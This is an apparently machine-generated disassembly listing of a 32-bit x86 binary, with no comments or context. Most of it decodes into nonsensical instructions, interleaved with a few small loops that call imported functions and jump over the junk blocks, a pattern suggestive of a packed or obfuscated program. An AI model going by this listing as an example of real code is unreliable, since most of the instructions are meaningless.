  406d61:	js     0x406d46
  406d63:	addr16 mov ebx,0xcd1c5374
  406d69:	mov    ss,ecx
  406d6b:	clc    
  406d6c:	aaa    
  406d6d:	xor    al,0x3d
  406d6f:	jl     0x406ded
  406d71:	or     eax,0x497c7c7f
  406d76:	sbb    DWORD PTR [ecx-0x3c0ed72f],ebp
  406d7c:	mov    DWORD PTR [edi-0x37],edx
  406d7f:	test   DWORD PTR [edi],esp
  406d81:	icebp  
  406d82:	and    eax,0x6f8a36bb
  406d87:	add    eax,0x9333dfbb
  406d8c:	mov    al,ds:0xfe825325
  406d91:	not    BYTE PTR [eax]
  406d93:	loope  0x406da9
  406d95:	cmp    DWORD PTR [ebp+eax*8+0xd771f66],esi
  406d9c:	xor    cl,ah
  406d9e:	jecxz  0x406dc1
  406da0:	pop    ss
  406da1:	mov    ecx,0x403a13b6
  406da6:	sbb    ch,cl
  406da8:	jmp    0x406e01
  406daa:	mov    ah,0x2b
  406dac:	xchg   ebx,eax
  406dad:	je     0x406d99
  406daf:	xchg   ecx,ebx
  406db1:	(bad)
  406db4:	shl    cl,0x95
  406db7:	sub    al,0xc0
  406db9:	adc    eax,0xc544a778
  406dbe:	scas   al,BYTE PTR es:[edi]
  406dbf:	cmp    al,0x67
  406dc1:	xor    DWORD PTR [edi+ecx*2],esp
  406dc4:	ficomp WORD PTR [edx-0x54]
  406dc7:	int3   
  406dc8:	enter  0xbbab,0x1d
  406dcc:	lea    esi,[edx]
  406dce:	sbb    dh,BYTE PTR [ebx-0x58]
  406dd1:	out    dx,al
  406dd2:	jge    0x406d79
  406dd4:	cs loop 0x406e11
  406dd7:	gs pop esi
  406dd9:	mov    edi,0x4f17ee4e
  406dde:	mov    ebp,DWORD PTR [esi-0x2787a169]
  406de4:	data16 and ah,BYTE PTR [esi]
  406de7:	aaa    
  406de8:	sub    DWORD PTR [ebp+0x41],eax
  406deb:	ja     0x406e56
  406ded:	div    al
  406def:	rcr    BYTE PTR [eax+edi*4],0x21
  406df3:	sub    BYTE PTR fs:[ecx+ebp*1-0x6fc6a4f2],ch
  406dfb:	call   0xac861e89
  406e00:	out    0xb,al
  406e02:	call   0xef5a:0x11749888
  406e09:	test   DWORD PTR [eax],edi
  406e0b:	push   0x5462162e
  406e10:	add    DWORD PTR [ecx+ebp*2-0x1b25343],ebx
  406e17:	cmp    DWORD PTR [edx+ebp*8-0x6b8da9da],edi
  406e1e:	and    eax,0xe0694cae
  406e23:	jecxz  0x406e9a
  406e25:	cmp    al,0xab
  406e27:	out    0xa9,al
  406e29:	adc    eax,0x9930f722
  406e2e:	push   cs
  406e2f:	mov    al,0xd4
  406e31:	jns    0x406df9
  406e33:	sar    BYTE PTR [ecx],cl
  406e35:	and    DWORD PTR [edi-0x909b152],ebx
  406e3b:	imul   ebp,DWORD PTR [ebx],0x5feb5291
  406e41:	jbe    0x406e5a
  406e43:	daa    
  406e44:	in     eax,dx
  406e45:	cld    
  406e46:	arpl   WORD PTR [edi],bx
  406e48:	sub    edi,esi
  406e4a:	retf   0xc051
  406e4d:	aam    0x94
  406e4f:	dec    ebx
  406e50:	and    eax,DWORD PTR [edi]
  406e52:	inc    esi
  406e53:	push   ds
  406e54:	mov    dh,0xfe
  406e56:	daa    
  406e57:	fistp  QWORD PTR [ebp-0x38]
  406e5a:	popa   
  406e5b:	das    
  406e5c:	in     eax,dx
  406e5d:	fincstp 
  406e5f:	out    0xda,eax
  406e61:	neg    BYTE PTR [eax+0x6f379b76]
  406e67:	push   esi
  406e68:	test   DWORD PTR [edi+0x4704ec84],ebx
  406e6e:	xor    eax,0x90c8732a
  406e73:	xchg   BYTE PTR [edi-0x6fe4f254],cl
  406e79:	and    eax,0x4f0a6869
  406e7e:	icebp  
  406e7f:	pop    esi
  406e80:	dec    ecx
  406e81:	pop    ecx
  406e82:	bound  edi,QWORD PTR [edi+edi*8+0x24058d30]
  406e89:	push   eax
  406e8a:	inc    esp
  406e8b:	add    bh,bh
  406e8d:	xor    BYTE PTR [ebp+0x44525805],cl
  406e93:	add    bh,bh
  406e95:	xor    BYTE PTR [ebp+0x44534805],cl
  406e9b:	add    bh,bh
  406e9d:	xor    BYTE PTR [edi-0x16bcbc2d],al
  406ea3:	daa    
  406ea4:	add    DWORD PTR [eax],eax
  406ea6:	add    BYTE PTR [ecx],bl
  406ea8:	retf   
  406ea9:	mov    ecx,0xd9627d6c
  406eae:	ins    DWORD PTR es:[edi],dx
  406eaf:	lods   al,BYTE PTR ds:[esi]
  406eb0:	test   eax,0x75637590
  406eb5:	pop    ecx
  406eb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406eb7:	lds    edi,FWORD PTR [esp+edi*2]
  406eba:	jl     0x406ec9
  406ebc:	jg     0x406f3a
  406ebe:	jl     0x406eec
  406ec0:	scas   eax,DWORD PTR es:[edi]
  406ec1:	in     al,0x4d
  406ec3:	fcom   QWORD PTR [edi]
  406ec5:	dec    ebx
  406ec6:	adc    eax,DWORD PTR [esp+eax*8+0x5eedff63]
  406ecd:	test   al,0xb
  406ecf:	mov    bh,0x49
  406ed1:	retf   0x57b1
  406ed4:	and    esi,DWORD PTR [ebp+0x64fcf7e7]
  406eda:	inc    ecx
  406edb:	mov    bh,BYTE PTR [ebp-0x24f39b87]
  406ee1:	or     DWORD PTR [ebp+0x1e],ecx
  406ee4:	mov    eax,0xdef98d63
  406ee9:	nop
  406eea:	loop   0x406f53
  406eec:	mov    ebp,0x38d8da87
  406ef1:	xchg   ebx,eax
  406ef2:	cdq    
  406ef3:	fistp  QWORD PTR [ecx+edi*4-0x7d]
  406ef7:	pop    esp
  406ef8:	inc    ebx
  406ef9:	jmp    0x406ead
  406efb:	sbb    BYTE PTR [ebx+edi*1+0x43],al
  406eff:	div    BYTE PTR [eax-0x3f]
  406f02:	aam    0xa
  406f04:	inc    edi
  406f05:	inc    esi
  406f06:	jge    0x406e8e
  406f08:	sahf   
  406f09:	into   
  406f0a:	or     al,0x9f
  406f0c:	jl     0x406f6f
  406f0e:	(bad)  
  406f0f:	(bad)  
  406f10:	mov    ds:0x3425b6c8,eax
  406f15:	mov    ds:0xc3804079,al
  406f1a:	jl     0x406f1e
  406f1c:	scas   al,BYTE PTR es:[edi]
  406f1d:	jmp    0x406f05
  406f1f:	pop    esp
  406f20:	hlt    
  406f21:	lea    esi,[eiz*8+0x204aa26c]
  406f28:	in     eax,dx
  406f29:	pusha  
  406f2a:	mov    dh,0x5a
  406f2c:	int    0x5
  406f2e:	jnp    0x406f0d
  406f30:	dec    edx
  406f31:	push   edx
  406f32:	mov    eax,ds:0xf6fd5da7
  406f37:	adc    dl,0xf0
  406f3a:	or     ebp,esp
  406f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f3d:	mov    al,ds:0xc3820542
  406f42:	in     eax,dx
  406f43:	xchg   edi,eax
  406f44:	jo     0x406fb4
  406f46:	push   ds
  406f47:	arpl   WORD PTR [ebx],dx
  406f49:	cmp    al,0x5a
  406f4b:	dec    edx
  406f4c:	push   eax
  406f4d:	xor    BYTE PTR [edi-0xd078c31],ch
  406f53:	add    edi,DWORD PTR [ecx+0x4d6aee5b]
  406f59:	(bad)  
  406f5a:	jl     0x406f2a
  406f5c:	sbb    DWORD PTR [ecx-0x371d43b3],ecx
  406f62:	push   ds
  406f63:	or     BYTE PTR [eax+edx*1],al
  406f66:	lds    ebp,FWORD PTR [edx+0x44]
  406f69:	aaa    
  406f6a:	enter  0x498c,0xad
  406f6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f6f:	push   ds
  406f70:	outs   dx,BYTE PTR ds:[esi]
  406f71:	mov    WORD PTR [edi*1+0x24523ffa],es
  406f78:	or     al,0xa6
  406f7a:	bndldx bnd0,[edi+esi*4-0x4c88fbbc]
  406f82:	lahf   
  406f83:	aam    0xfd
  406f85:	inc    esp
  406f86:	sbb    cl,BYTE PTR [ecx+0x6c9d674d]
  406f8c:	push   ebx
  406f8d:	fild   DWORD PTR [esi-0x7e]
  406f90:	js     0x406f55
  406f92:	shl    BYTE PTR [ebx+0x34],1
  406f95:	xlat   BYTE PTR ds:[ebx]
  406f96:	or     al,BYTE PTR [eax+0x60aab01a]
  406f9c:	in     al,dx
  406f9d:	mov    ebp,0x744d77d6
  406fa2:	inc    esp
  406fa3:	jl     0x406f71
  406fa5:	cwde   
  406fa6:	and    DWORD PTR [ecx+0x0],0xffffffe0
  406faa:	and    BYTE PTR [ecx-0x78dc8589],dh
  406fb0:	dec    ebp
  406fb1:	retf   0x35
  406fb4:	inc    ebp
  406fb5:	xchg   ebp,eax
  406fb6:	jmp    FWORD PTR [ebp+0x156bbbae]
  406fbc:	arpl   di,dx
  406fbe:	mov    BYTE PTR [esi+0x599726fc],ah
  406fc4:	loope  0x406fad
  406fc6:	push   eax
  406fc7:	sub    al,0x93
  406fc9:	imul   ebp,DWORD PTR [ebx-0x7b],0x47
  406fcd:	inc    esp
  406fce:	sub    ebx,0x3
  406fd1:	push   ebx
  406fd2:	pop    eax
  406fd3:	call   DWORD PTR [eax+0x1]
  406fd6:	mov    eax,DWORD PTR [ebp-0x20]
  406fd9:	mov    ecx,DWORD PTR ds:0x44521c
  406fdf:	jmp    0x40710b
  406fe4:	gs jg  0x406fc0
  406fe7:	add    DWORD PTR [ebp-0x27],edi
  406fea:	jge    0x40703f
  406fec:	jecxz  0x406fd1
  406fee:	stos   DWORD PTR es:[edi],eax
  406fef:	ins    BYTE PTR es:[edi],dx
  406ff0:	test   al,0xd5
  406ff2:	sbb    al,ch
  406ff4:	sar    BYTE PTR [edi],cl
  406ff6:	jl     0x407074
  406ff8:	or     eax,0x5a7c7c7f
  406ffd:	icebp  
  406ffe:	mov    dl,0x23
  407000:	lea    ecx,[esi-0x3e708ee7]
  407006:	stos   DWORD PTR es:[edi],eax
  407007:	and    al,0xae
  407009:	push   es
  40700a:	mov    dl,0x52
  40700c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40700d:	dec    edi
  40700e:	rcl    DWORD PTR [edx-0x7c],cl
  407011:	inc    edx
  407012:	xor    DWORD PTR [ebp+0x2d],0xffffff87
  407016:	shr    DWORD PTR [ebp+ebx*1-0x676860fe],cl
  40701d:	lods   al,BYTE PTR ds:[esi]
  40701e:	pop    esp
  40701f:	dec    ebp
  407020:	aam    0xed
  407022:	sub    al,0x8d
  407024:	push   0x34
  407026:	aad    0xb1
  407028:	mov    ch,0x7e
  40702a:	push   esi
  40702b:	xchg   DWORD PTR [edx-0x1dda31f],ecx
  407031:	pushf  
  407032:	xchg   ebx,eax
  407033:	addr16 xchg ecx,eax
  407035:	call   0x17607ee8
  40703a:	sbb    DWORD PTR [eax],edx
  40703c:	pop    ebp
  40703d:	xor    al,0x4
  40703f:	xor    ch,bl
  407041:	bound  esi,QWORD PTR [esi]
  407043:	inc    esi
  407044:	adc    eax,eax
  407046:	xor    eax,0xc5a52718
  40704b:	ins    BYTE PTR es:[edi],dx
  40704c:	lea    edi,[edx-0x17]
  40704f:	outs   dx,BYTE PTR ds:[esi]
  407050:	(bad)
  407053:	aaa    
  407054:	adc    DWORD PTR [edi+0x4d],ebp
  407057:	sbb    al,0x69
  407059:	dec    esp
  40705a:	and    eax,0xa6bd2d71
  40705f:	rcl    BYTE PTR [edx],1
  407061:	sar    BYTE PTR [edi],0x71
  407064:	loopne 0x407078
  407066:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407067:	cs gs cwde 
  40706a:	cmc    
  40706b:	push   ebx
  40706c:	inc    esp
  40706d:	push   0x7c
  40706f:	xchg   ebx,eax
  407070:	and    eax,DWORD PTR [ecx+edi*2-0x623d3801]
  407077:	stos   DWORD PTR es:[edi],eax
  407078:	push   eax
  407079:	mov    BYTE PTR [ecx+eax*1],bl
  40707c:	cmp    eax,0x10ebbb29
  407081:	lea    eax,[eax+eiz*1+0x68a68067]
  407088:	jge    0x40705d
  40708a:	mov    edi,0x9a37d198
  40708f:	pop    ecx
  407090:	fwait
  407091:	sub    al,0xe9
  407093:	sbb    eax,0xe6ad06f2
  407098:	xchg   edi,eax
  407099:	fcomp  DWORD PTR [edi-0x21c3d223]
  40709f:	and    al,0xfb
  4070a1:	outs   dx,BYTE PTR ds:[esi]
  4070a2:	add    BYTE PTR [eax],bl
  4070a4:	sub    eax,0x38e0ab33
  4070a9:	dec    esi
  4070aa:	icebp  
  4070ab:	dec    eax
  4070ac:	in     eax,dx
  4070ad:	les    ecx,FWORD PTR [edi]
  4070af:	fs and edx,edi
  4070b2:	stos   DWORD PTR es:[edi],eax
  4070b3:	lods   eax,DWORD PTR ds:[esi]
  4070b4:	sub    esi,edx
  4070b6:	iret   
  4070b7:	or     BYTE PTR ds:0x13ce9158,0x32
  4070be:	(bad)  
  4070bf:	mov    ebx,0xb76d1332
  4070c4:	inc    edi
  4070c5:	fnstsw WORD PTR [ecx+0x45]
  4070c8:	mov    edi,0x27daec92
  4070cd:	or     BYTE PTR [edi-0x7be541dc],0x98
  4070d4:	hlt    
  4070d5:	mov    WORD PTR [esi-0x61],ds
  4070d8:	fnstsw WORD PTR [eax]
  4070da:	add    eax,0x147c8cca
  4070df:	aas    
  4070e0:	shr    DWORD PTR [ecx],1
  4070e2:	hlt    
  4070e3:	into   
  4070e4:	push   ebx
  4070e5:	dec    esi
  4070e6:	mov    esi,0x2522684f
  4070eb:	push   eax
  4070ec:	inc    esp
  4070ed:	sahf   
  4070ee:	ins    DWORD PTR es:[edi],dx
  4070ef:	and    BYTE PTR [eax-0x4b],ch
  4070f2:	into   
  4070f3:	sub    eax,DWORD PTR [edx+eax*1+0x24]
  4070f7:	or     dl,BYTE PTR [edx]
  4070f9:	arpl   WORD PTR [ecx+0x73785698],bx
  4070ff:	hlt    
  407100:	xor    ebx,esp
  407102:	xchg   ebp,eax
  407103:	push   esp
  407104:	inc    ebx
  407105:	pop    ss
  407106:	mov    eax,ds:0x3bfbc94e
  40710b:	add    DWORD PTR [eax],ecx
  40710d:	pop    edi
  40710e:	pop    esi
  40710f:	pop    ebx
  407110:	leave  
  407111:	ret    
  407112:	push   ebp
  407113:	mov    ebp,esp
  407115:	sub    esp,0x2c
  407118:	xor    eax,0x6ce
  40711d:	mov    DWORD PTR [ebp-0x8],0xf89c8534
  407124:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  40712b:	or     DWORD PTR ds:0x44e414,0x5a5
  407135:	jmp    0x40726c
  40713a:	push   ds
  40713b:	repz lock adc al,0x95
  40713f:	pop    ss
  407140:	stos   BYTE PTR es:[edi],al
  407141:	lea    edi,[esi+0x16]
  407144:	nop
  407145:	push   ebx
  407146:	jp     0x407130
  407148:	push   ss
  407149:	retf   
  40714a:	jecxz  0x40718a
  40714c:	jl     0x4071ca
  40714e:	push   es
  40714f:	jg     0x4071cd
  407151:	jl     0x407197
  407153:	mov    cl,0x3e
  407155:	(bad)  
  407156:	fcmove st,st(2)
  407158:	in     al,dx
  407159:	call   0xc37e0c85
  40715e:	push   cs
  40715f:	jp     0x4070f6
  407161:	or     al,0x3e
  407163:	mov    ch,BYTE PTR [eax-0x71124f5]
  407169:	pop    edx
  40716a:	pop    esp
  40716b:	lock mov eax,0x8d11e9e7
  407171:	push   ebp
  407172:	cwde   
  407173:	cmp    DWORD PTR [eax],ebp
  407175:	cmc    
  407176:	inc    ecx
  407177:	arpl   WORD PTR [esi+0x46cf9b50],sp
  40717d:	mov    ds:0xb067947f,eax
  407182:	sub    bh,bl
  407184:	fs pop esi
  407186:	xchg   edx,eax
  407187:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407188:	scas   eax,DWORD PTR es:[edi]
  407189:	fcom   QWORD PTR ds:0x16f21978
  40718f:	sbb    al,dh
  407191:	fistp  QWORD PTR [esi]
  407193:	jb     0x40714a
  407195:	int3   
  407196:	aas    
  407197:	inc    ebp
  407198:	lods   al,BYTE PTR ds:[esi]
  407199:	pop    esi
  40719a:	cmp    BYTE PTR [ecx+0x67],cl
  40719d:	fcom   st(1)
  40719f:	cmc    
  4071a0:	repz daa 
  4071a2:	mov    esi,0x6bcb149d
  4071a7:	cmp    edi,DWORD PTR [ecx+0xce8cc82]
  4071ad:	aaa    
  4071ae:	cdq    
  4071af:	inc    eax
  4071b0:	std    
  4071b1:	daa    
  4071b2:	adc    DWORD PTR [ebx-0x2e],0x5331ff99
  4071b9:	xor    DWORD PTR [eax-0x17e1c81e],ebp
  4071bf:	sub    DWORD PTR [edi+0x31937fc6],0xfd89918c
  4071c9:	push   esp
  4071ca:	push   edx
  4071cb:	dec    ebp
  4071cc:	aad    0xb4
  4071ce:	loop   0x407218
  4071d0:	jmp    0x40717d
  4071d2:	inc    ebx
  4071d3:	rcl    BYTE PTR [eax-0x3fd201e1],cl
  4071d9:	sbb    DWORD PTR [ecx],edi
  4071db:	push   ss
  4071dc:	sub    al,BYTE PTR [ecx]
  4071de:	test   BYTE PTR [ebx],ah
  4071e0:	pop    ss
  4071e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071e2:	dec    edi
  4071e3:	das    
  4071e4:	mov    edi,0xbb7c6028
  4071e9:	mov    eax,0xb19e00e1
  4071ef:	cmp    al,0x40
  4071f1:	adc    BYTE PTR [ecx+0x3da8c6cf],ah
  4071f7:	jnp    0x40724c
  4071f9:	sbb    eax,DWORD PTR [esp+ebx*4]
  4071fc:	mov    ebx,0x2da5734e
  407201:	sub    edx,edx
  407203:	inc    ebx
  407204:	repz sub al,0x74
  407207:	sub    BYTE PTR [esi+ebx*2-0x3a2a96da],bl
  40720e:	sahf   
  40720f:	in     al,0x16
  407211:	push   ebx
  407212:	lds    ebp,FWORD PTR [edi+0x3a]
  407215:	sbb    bl,BYTE PTR [edx+0x44]
  407218:	shl    BYTE PTR [edi+0x361a1627],1
  40721e:	test   BYTE PTR [ebp+0x26fbc46a],0x9f
  407225:	sbb    eax,0x934a3d0e
  40722a:	loop   0x407239
  40722c:	mov    esp,0x78ef0733
  407231:	sar    DWORD PTR [ecx+0xd6d4ab6],1
  407237:	or     edi,DWORD PTR ds:0x9043b033
  40723d:	call   0x3c2e:0xf996eb55
  407244:	mov    edi,0xb9447f8f
  407249:	push   ebp
  40724a:	pop    esi
  40724b:	push   ebx
  40724c:	cmp    edx,DWORD PTR [ecx+0x2f]
  40724f:	mov    fs:0x58119725,eax
  407255:	ret    
  407256:	inc    ecx
  407257:	sub    dl,BYTE PTR cs:[esi-0x37]
  40725b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40725c:	repz add al,0xaa
  40725f:	push   eax
  407260:	(bad)
  407263:	mov    eax,ds:0x929a34e1
  407268:	xchg   edi,eax
  407269:	sub    bl,BYTE PTR [esi-0x6af84760]
  40726f:	add    BYTE PTR [eax],al
  407271:	and    DWORD PTR ds:0x41074f,0x0
  40727b:	mov    ecx,DWORD PTR ds:0x41074f
  407281:	inc    ecx
  407282:	mov    DWORD PTR ds:0x41074f,ecx
  407288:	cmp    DWORD PTR ds:0x41074f,0x20
  40728f:	jne    0x4072a0
  407295:	push   0x4247ce
  40729a:	call   DWORD PTR ds:0x44336c
  4072a0:	cmp    DWORD PTR ds:0x41074f,0x10
  4072a7:	jb     0x40727b
  4072ad:	or     DWORD PTR ds:0x44b6dc,0x61e1
  4072b7:	mov    WORD PTR [ebp-0x4],ax
  4072bb:	xor    DWORD PTR ds:0x44b6e0,0xdd9
  4072c5:	lea    eax,[ebp-0x24]
  4072c8:	and    ecx,DWORD PTR ds:0x44b6d8
  4072ce:	jmp    0x407405
  4072d3:	div    DWORD PTR [eax]
  4072d5:	test   BYTE PTR [ebx],ah
  4072d7:	pop    ebx
  4072d8:	jnp    0x407285
  4072da:	js     0x407349
  4072dc:	ds xchg ebx,eax
  4072de:	mov    esp,0x56ab2882
  4072e3:	lea    esi,[ecx]
  4072e5:	jl     0x407363
  4072e7:	push   es
  4072e8:	jg     0x407366
  4072ea:	jl     0x4072c1
  4072ec:	dec    esp
  4072ed:	arpl   WORD PTR [ecx],si
  4072ef:	jo     0x4072fb
  4072f1:	inc    ecx
  4072f2:	bnd jge 0x40728f
  4072f5:	dec    ebx
  4072f6:	in     al,0x80
  4072f8:	(bad)  
  4072fa:	or     al,0x68
  4072fc:	cmp    eax,0x51263b9b
  407301:	enter  0xd4fb,0x68
  407305:	sub    DWORD PTR [edi-0xe],esi
  407308:	or     al,0xb8
  40730a:	lea    ebp,[edi-0x5d]
  40730d:	adc    esp,edx
  40730f:	fldenv [edi+eax*8]
  407312:	push   eax
  407313:	and    DWORD PTR [ebx+0x16554604],0x837ee72e
  40731d:	shl    esi,1
  40731f:	xchg   ecx,eax
  407320:	jl     0x4072e1
  407322:	pop    edx
  407323:	push   edx
  407324:	or     DWORD PTR [ecx+0x30e0c88e],esp
  40732a:	pop    ebp
  40732b:	jo     0x407324
  40732d:	aam    0x4a
  40732f:	je     0x4072d8
  407331:	or     esp,eax
  407333:	and    DWORD PTR [edx],edi
  407335:	rcl    BYTE PTR [ebx-0x3ea2f324],1
  40733b:	aas    
  40733c:	neg    DWORD PTR [ebx+0x2874e10d]
  407342:	inc    esp
  407343:	inc    edi
  407344:	popf   
  407345:	or     DWORD PTR [esi+0x9d766a5],edi
  40734b:	lea    edi,[edx]
  40734d:	mov    ds:0x90de848d,al
  407352:	and    al,0xa3
  407354:	inc    eax
  407355:	cs jns 0x407377
  407358:	in     eax,0x71
  40735a:	adc    DWORD PTR [esi+0x7],ebp
  40735d:	add    al,0xe9
  40735f:	call   0xb403:0x5b6d0832
  407366:	fwait
  407367:	shl    DWORD PTR [esi+0x1519c847],cl
  40736d:	ins    DWORD PTR es:[edi],dx
  40736e:	rol    DWORD PTR [edx],cl
  407370:	fidiv  DWORD PTR [ebx-0x5]
  407373:	in     al,dx
  407374:	fld    TBYTE PTR [ebx]
  407376:	shl    DWORD PTR [edi],1
  407378:	xchg   DWORD PTR [esi+0x70af1abe],esp
  40737e:	add    DWORD PTR [ebp-0xd],eax
  407381:	and    ecx,esp
  407383:	push   es
  407384:	or     ebx,DWORD PTR [ecx+0x44075497]
  40738a:	adc    DWORD PTR [esi+ebx*4+0x21],ebp
  40738e:	push   ecx
  40738f:	enter  0x21ac,0xf1
  407393:	inc    eax
  407394:	aaa    
  407395:	jne    0x407394
  407397:	dec    esi
  407398:	dec    esi
  407399:	inc    ecx
  40739a:	fmul   QWORD PTR [eax+0x50a683cc]
  4073a0:	xchg   ebx,eax
  4073a1:	cwde   
  4073a2:	iret   
  4073a3:	cmp    eax,DWORD PTR [edx-0x1b490d8f]
  4073a9:	or     DWORD PTR [edi-0x5359a769],0x7d
  4073b0:	psadbw mm0,QWORD PTR [eax+esi*4]
  4073b4:	jno    0x407421
  4073b6:	fstp   DWORD PTR [ebx-0x62a19e3]
  4073bc:	sub    BYTE PTR [esi],cl
  4073be:	mov    bl,0xa0
  4073c0:	inc    edi
  4073c1:	and    edx,DWORD PTR [edx+0x22a10438]
  4073c7:	(bad)  
  4073c8:	in     eax,dx
  4073c9:	pop    es
  4073ca:	arpl   WORD PTR [esi-0x77],si
  4073cd:	es inc edi
  4073cf:	inc    edx
  4073d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073d1:	imul   esi,DWORD PTR [eax-0x69],0x32
  4073d5:	jmp    0x40735e
  4073d7:	and    eax,0x4164b90e
  4073dc:	scas   eax,DWORD PTR es:[edi]
  4073dd:	(bad)  
  4073de:	retf   0xfb3
  4073e1:	adc    bl,BYTE PTR [ecx]
  4073e3:	push   ebp
  4073e4:	lahf   
  4073e5:	push   eax
  4073e6:	das    
  4073e7:	mov    eax,0x129ebe19
  4073ec:	lods   al,BYTE PTR ds:[esi]
  4073ed:	jmp    0xcb24:0xf8f69f43
  4073f4:	cdq    
  4073f5:	fld    st(2)
  4073f7:	out    dx,al
  4073f8:	or     al,0xde
  4073fa:	ja     0x4073ff
  4073fc:	ret    0x7b49
  4073ff:	pusha  
  407400:	dec    esi
  407401:	pop    eax
  407402:	call   0xe9d8:0x4589801e
  407409:	xor    al,BYTE PTR [ecx]
  40740b:	add    BYTE PTR [eax],al
  40740d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40740e:	(bad)  [ecx+0x67666966]
  407414:	fld    DWORD PTR [edx]
  407416:	xor    eax,0x45fbcc56
  40741b:	jo     0x407485
  40741d:	xchg   edi,eax
  40741e:	xor    BYTE PTR [esp+edi*2+0x6],bh
  407422:	jg     0x4074a0
  407424:	jl     0x407435
  407426:	pop    eax
  407427:	mov    dl,0xc9
  407429:	fwait
  40742a:	xchg   esi,eax
  40742b:	mov    ecx,edi
  40742d:	dec    edi
  40742e:	xlat   BYTE PTR ds:[ebx]
  40742f:	repz sahf 
  407431:	xor    bh,bh
  407433:	inc    edx
  407434:	xchg   bl,ah
  407436:	rcr    DWORD PTR [ecx+edx*4-0x3d25c0f5],0x6d
  40743e:	xadd   DWORD PTR [ecx+0x64f0fa2f],edx
  407445:	repnz fcom DWORD PTR [esp+eax*4]
  407449:	xor    edi,DWORD PTR [ecx+0x25]
  40744c:	in     eax,0x95
  40744e:	mov    ebx,ss
  407450:	out    dx,al
  407451:	lahf   
  407452:	dec    esi
  407453:	in     al,dx
  407454:	add    eax,0x1d9d9367
  407459:	test   ebx,edx
  40745b:	jmp    0x252:0x6c4a6fc8
  407462:	add    BYTE PTR [esi+0x46],ch
  407465:	push   cs
  407466:	inc    ebx
  407467:	jmp    0xcaa:0xaf217644
  40746e:	ins    DWORD PTR es:[edi],dx
  40746f:	pop    ss
  407470:	outs   dx,DWORD PTR ds:[esi]
  407471:	hlt    
  407472:	mov    ebp,0xdc072962
  407478:	push   cs
  407479:	jg     0x407449
  40747b:	icebp  
  40747c:	or     cl,dh
  40747e:	test   al,0x34
  407480:	and    esp,DWORD PTR [edi]
  407482:	sahf   
  407483:	jp     0x4074b4
  407485:	dec    esp
  407486:	fist   DWORD PTR ds:0x8d4a2f2a
  40748c:	(bad)  
  40748d:	out    dx,eax
  40748e:	mov    al,0xa7
  407490:	call   0x3f41:0xbb8dda8c
  407497:	jo     0x407480
  407499:	add    DWORD PTR [ebp-0xf9b0d31],ebx
  40749f:	pop    edx
  4074a0:	sbb    DWORD PTR [ecx+0x3d9bc595],0xffffffba
  4074a7:	fimul  DWORD PTR [edx+0xc7415f4]
  4074ad:	pusha  
  4074ae:	jmp    0x407459
  4074b0:	jle    0x4074ce
  4074b2:	loopne 0x40743b
  4074b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074b5:	rol    esi,cl
  4074b7:	ds xchg esi,eax
  4074b9:	test   al,0xaf
  4074bb:	(bad)  
  4074bd:	shr    BYTE PTR [esi-0x5023dd65],0xd5
  4074c4:	xor    bl,ah
  4074c6:	out    0xc5,eax
  4074c8:	push   ss
  4074c9:	jle    0x40747d
  4074cb:	add    ch,BYTE PTR [ebx-0xa7ad313]
  4074d1:	xor    eax,0x414ef2dc
  4074d6:	int    0x98
  4074d8:	jo     0x407509
  4074da:	and    al,0xaa
  4074dc:	or     DWORD PTR [eax+0x52],esi
  4074df:	shr    BYTE PTR [edx*8-0x38d5c588],1
  4074e6:	pop    ss
  4074e7:	jmp    0x563410c0
  4074ec:	pop    ecx
  4074ed:	div    eax
  4074ef:	mov    edi,0xb6016475
  4074f4:	sbb    ebp,eax
  4074f6:	imul   ebx,DWORD PTR [edx],0xffffffd4
  4074f9:	adc    BYTE PTR [ebp-0x51],bl
  4074fc:	call   0xc5e7:0x88311875
  407503:	mov    esp,0x1a4bd01d
  407508:	fst    st(5)
  40750a:	adc    ebx,esi
  40750c:	mov    dh,0xa3
  40750e:	sbb    DWORD PTR [ecx],esi
  407510:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407511:	add    al,0xa1
  407513:	imul   ebx,DWORD PTR [ebp+eax*4+0x67],0xe962882c
  40751b:	cmp    bh,BYTE PTR [edi-0x1095bab5]
  407521:	icebp  
  407522:	sbb    BYTE PTR [eax],0x81
  407525:	shr    DWORD PTR [edi],0xc5
  407528:	clc    
  407529:	js     0x40756d
  40752b:	outs   dx,DWORD PTR ds:[esi]
  40752c:	and    DWORD PTR [ebp-0x76],esi
  40752f:	call   0xe4486a0
  407534:	xchg   ebp,eax
  407535:	pop    es
  407536:	neg    al
  407538:	ret    
  407539:	in     al,dx
  40753a:	mov    ebx,0x2aa231b7
  40753f:	mov    eax,DWORD PTR [ebp+0x8]
  407542:	add    ecx,DWORD PTR ds:0x44b6e0
  407548:	mov    DWORD PTR [ebp-0x20],eax
  40754b:	sbb    ecx,0x41ef
  407551:	push   ebx
  407552:	lea    eax,[ebp-0x18]
  407555:	mov    DWORD PTR [ebp-0x1c],eax
  407558:	mov    eax,DWORD PTR [ebp-0x1c]
  40755b:	adc    DWORD PTR ds:0x44e410,ecx
  407561:	push   esi
  407562:	push   edi
  407563:	mov    edi,0xf89f2dad
  407568:	or     DWORD PTR ds:0x44b6d8,0x25a
  407572:	mov    DWORD PTR [eax],edi
  407574:	mov    eax,DWORD PTR [ebp-0x14]
  407577:	mov    ebx,DWORD PTR [ebp-0x8]
  40757a:	and    esi,0x501d
  407580:	mov    ecx,0x7510857
  407585:	xor    eax,ecx
  407587:	and    DWORD PTR ds:0x4247da,0x0
  407591:	xor    esi,esi
  407593:	or     esi,DWORD PTR ds:0x4247da
  407599:	inc    esi
  40759a:	mov    DWORD PTR ds:0x4247da,esi
  4075a0:	cmp    DWORD PTR ds:0x4247da,0x24
  4075a7:	jne    0x4075b8
  4075ad:	push   0x41088a
  4075b2:	call   DWORD PTR ds:0x443374
  4075b8:	cmp    DWORD PTR ds:0x4247da,0x18
